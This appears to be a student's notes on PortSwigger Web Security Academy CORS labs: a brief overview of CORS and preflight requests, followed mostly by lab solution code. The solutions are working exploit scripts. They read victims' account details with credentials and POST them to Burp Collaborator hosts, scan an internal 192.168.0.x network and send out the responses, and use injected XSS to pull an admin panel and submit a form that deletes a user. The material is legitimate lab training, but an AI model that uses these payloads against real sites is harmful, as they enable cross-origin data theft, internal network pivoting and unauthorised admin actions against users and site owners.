# Cross-origin resource sharing (CORS)

### Vulnerabilities

- Allowing all origins

- Not sanitising white-listed origins properly

- Allowing null origins

- Poorly configured CORS with insecure TLS

### Overview

- [Same Origin Policy](https://portswigger.net/web-security/cors/same-origin-policy)

  - Implemented on [browser](https://crashtest-security.com/same-origin-policy-sop/) side

- [CORS](https://portswigger.net/web-security/cors/access-control-allow-origin)

  - Implemented on [both browser and server](https://stackoverflow.com/questions/36958999/cors-is-it-a-client-side-thing-a-server-side-thing-or-a-transport-level-thin)

  - [CORS preflight](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request) 

    - Under certain circumstances, when a cross-domain request includes a non-standard HTTP method or headers, the cross-origin request is preceded by a request using the OPTIONS method, and the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request. This is called the pre-flight check. The server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed.
    
    - Example of a preflight request

      ```
      OPTIONS /data HTTP/1.1
      Host: <some website>
      ...
      Origin: https://normal-website.com
      Access-Control-Request-Method: PUT
      Access-Control-Request-Headers: Special-Request-Header
      ```
    
    - Response to preflight request

      ```
      HTTP/1.1 204 No Content
      ...
      Access-Control-Allow-Origin: https://normal-website.com
      Access-Control-Allow-Methods: PUT, POST, OPTIONS
      Access-Control-Allow-Headers: Special-Request-Header
      Access-Control-Allow-Credentials: true
      Access-Control-Max-Age: 240
      ```

### Lab: CORS vulnerability with basic origin reflection

Solution:

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0ab300e8036ae661c0c2293f00de0080.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    fetch('https://laz2g5udqefjy0n2vjo7omsbs2ytmi.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: req.responseText});
};
</script>
```

### Lab: CORS vulnerability with trusted null origin

Solution:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a26001503c383fac154064c00b4009c.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0afd009b03cb83d2c10d062e015f0070.web-security-academy.net/log?key='+this.responseText;
fetch('https://a3eljf8ml9ttdhrgarv3982prgx6lv.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: req.responseText});
};
</script>"></iframe>
```

### Breaking TLS with poorly configured CORS

Stock Check API vulnerable to XSS

```
GET /?productId=2<script>alert(12345)</script>&storeId=1 HTTP/1.1
Host: stock.0ac4005904f4b611c0980e0200bf0050.web-security-academy.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Solution:

```
<script>
<!-- https://www.w3schools.com/howto/howto_js_redirect_webpage.asp -->
window.location.href = "http://stock.0ac4005904f4b611c0980e0200bf0050.web-security-academy.net/?productId=2%3Cscript%3Ealert(%22hoping it works%22);var req = new XMLHttpRequest();req.onload = reqListener;req.open(%22get%22,%22https://0ac4005904f4b611c0980e0200bf0050.web-security-academy.net/accountDetails%22,true);req.withCredentials = true;req.send();function reqListener() {fetch(%22https://0efgxv22sc4xjuhhv7x7tzg05rbpze.burpcollaborator.net%22, {method: %22POST%22, mode: %22no-cors%22, body: req.responseText});};%3C%2Fscript%3E&storeId=1"
</script>
```

- [Redirecting webpages using javascript](https://www.w3schools.com/howto/howto_js_redirect_webpage.asp)

- [URL encoding/decoding tool](https://meyerweb.com/eric/tools/dencoder/)

### Lab: CORS vulnerability with internal network pivot attack

Part 1:

```
<script>
for (let i = 0; i < 256; i++) {
  fetch('http://192.168.0.' + i + ':8080', {method: 'GET'}) <!-- cannot put no cors -->
    .then(response => response.text())
    .then((text) => {
      try {
       fetch('http://0ef9fq4pj7a92vqr6acmp9bcw32tqi.burpcollaborator.net?ip=' + 'http://192.168.0.' + i + ':8080', {method: 'POST', mode: 'no-cors', body: text })
      } catch(err) {}
    })
}
</script>
```

Part 1 Output:

```
POST /?ip=http://192.168.0.114:8080 HTTP/1.1
Host: 0ef9fq4pj7a92vqr6acmp9bcw32tqi.burpcollaborator.net
Connection: keep-alive
Content-Length: 3335
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.52 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://exploit-0ab000c903b93d00c0d721ae018b0043.web-security-academy.net
Referer: http://exploit-0ab000c903b93d00c0d721ae018b0043.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>&#67;&#79;&#82;&#83;&#32;&#118;&#117;&#108;&#110;&#101;&#114;&#97;&#98;&#105;&#108;&#105;&#116;&#121;&#32;&#119;&#105;&#116;&#104;&#32;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#32;&#110;&#101;&#116;&#119;&#111;&#114;&#107;&#32;&#112;&#105;&#118;&#111;&#116;&#32;&#97;&#116;&#116;&#97;&#99;&#107;</title>
    </head>
    <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
    <section class='academyLabBanner'>
        <div class=container>
            <div class=logo></div>
                <div class=title-container>
                    <h2>CORS vulnerability with internal network pivot attack</h2>
                    <a id='exploit-link' class='button' target='_blank' href='http://exploit-0ab000c903b93d00c0d721ae018b0043.web-security-academy.net'>Go to exploit server</a>
                    <a class=link-back href='https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack'>
                        Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                        <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                            <g>
                                <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                            </g>
                        </svg>
                    </a>
                </div>
                <div class='widgetcontainer-lab-status is-notsolved'>
                    <span>LAB</span>
                    <p>Not solved</p>
                    <span class=lab-status-icon></span>
                </div>
            </div>
        </div>
    </section>
</div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action=/login>
                            <input required type="hidden" name="csrf" value="qAeeDsND32RkWscdqe4xEevRNcVSyCY7">
                            <label>Username</label>
                            <input required type=username name="username">
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
        </div>
    </body>
</html>
```

Part 2:

```
<script>
var ip = 'http://192.168.0.147:8080'
var collab = 'http://8nwhoydxsfjhb3zzfiluyhkk5bb5zu.burpcollaborator.net'
var xss_payload = ' "><img src=" ' + collab + ' ?xssfound=1"> ' 
  fetch(ip, {method: 'GET'}) <!-- cannot put no cors -->
    .then(response => response.text())
    .then((text) => {
        login_path = '/login?username=' + encodeURIComponent(xss_payload) + '&password=random&csrf=' + text.match(/name="csrf" value="([^"]*)"/)[1]
        location = ip + login_path 
  })
</script>
```

- Regex to obtain csrf token: `name="csrf" value="([^"]*)"`. Test regex over [here](https://regex101.com/)

- This payload will be planted in the value parameter:

  ```
  e.g. <input required type=username name="username">
                      |
                      v
                   becomes
                      |
                      v
       <input required type=username name="username" value=""><img src=" ' + collab + ' "?xssfound=1>">
  ```

Part 3:

```
<script>
var ip = 'http://192.168.0.147:8080'
var collab = 'http://8nwhoydxsfjhb3zzfiluyhkk5bb5zu.burpcollaborator.net'
var xss_payload = ' "><iframe src=/admin onload="new Image().src=\' ' + collab + '?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"> '
  fetch(ip, {method: 'GET'}) <!-- cannot put no cors -->
    .then(response => response.text())
    .then((text) => {
        login_path = '/login?username=' + encodeURIComponent(xss_payload) + '&password=random&csrf=' + text.match(/name="csrf" value="([^"]*)"/)[1]
        location = ip + login_path 
  })
</script>
```

```
<script>
var ip = 'http://192.168.0.147:8080'
var collab = 'http://8nwhoydxsfjhb3zzfiluyhkk5bb5zu.burpcollaborator.net'
var xss_payload = ' "><iframe src=/admin onload="fetch(\' ' + collab + ' \', {method: \'POST\', mode: \'no-cors\', body: this.contentWindow.document.body.innerHTML})">'
  fetch(ip, {method: 'GET'}) <!-- cannot put no cors -->
    .then(response => response.text())
    .then((text) => {
        login_path = '/login?username=' + encodeURIComponent(xss_payload) + '&password=random&csrf=' + text.match(/name="csrf" value="([^"]*)"/)[1]
        location = ip + login_path 
  })
</script>
```

- `iframe`'s onload attribute runs javascript

Part 3 Output:

```
<script src="/resources/labheader/js/labHeader.js"></script>
<div id="academyLabHeader">
<section class="academyLabBanner">
<div class="container">
<div class="logo"></div>
<div class="title-container">
<h2>CORS vulnerability with internal network pivot attack</h2>
<a id="exploit-link" class="button" target="_blank" href="http://exploit-0a700089035f16b9c0d2455b0137003c.web-security-academy.net">Go to exploit server</a>
<a class="link-back" href="https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack">
  Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
  <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 28 30" enable-background="new 0 0 28 30" xml:space="preserve" title="back-arrow">
      <g>
          <polygon points="1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"></polygon>
          <polygon points="14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"></polygon>
      </g>
  </svg>
</a>
</div>
<div class="widgetcontainer-lab-status is-notsolved">
<span>LAB</span>
<p>Not solved</p>
<span class="lab-status-icon"></span>
</div>
</div>
</section></div>


<div theme="">
<section class="maincontainer">
<div class="container is-page">
<header class="navigation-header">
  <section class="top-links">
      <a href="/">Home</a><p>|</p>
      <a href="/admin">Admin panel</a><p>|</p>
      <a href="/my-account?id=administrator">My account</a><p>|</p>
  </section>
</header>
<header class="notification-header">
</header>
<form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
  <input required="" type="hidden" name="csrf" value="BdtgS5KgiWrfss6AHnGV1YNrLe2hOtL7">
  <label>Username</label>
  <input required="" type="text" name="username">
  <button class="button" type="submit">Delete user</button>
</form>
</div>
</section>
</div>
```

Part 4:

```
<script>
var ip = 'http://192.168.0.147:8080'
var collab = 'http://8nwhoydxsfjhb3zzfiluyhkk5bb5zu.burpcollaborator.net'
var xss_payload = ' "><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()"> '
  fetch(ip, {method: 'GET'}) <!-- cannot put no cors -->
    .then(response => response.text())
    .then((text) => {
        login_path = '/login?username=' + encodeURIComponent(xss_payload) + '&password=random&csrf=' + text.match(/name="csrf" value="([^"]*)"/)[1]
        location = ip + login_path 
  })
</script>
```












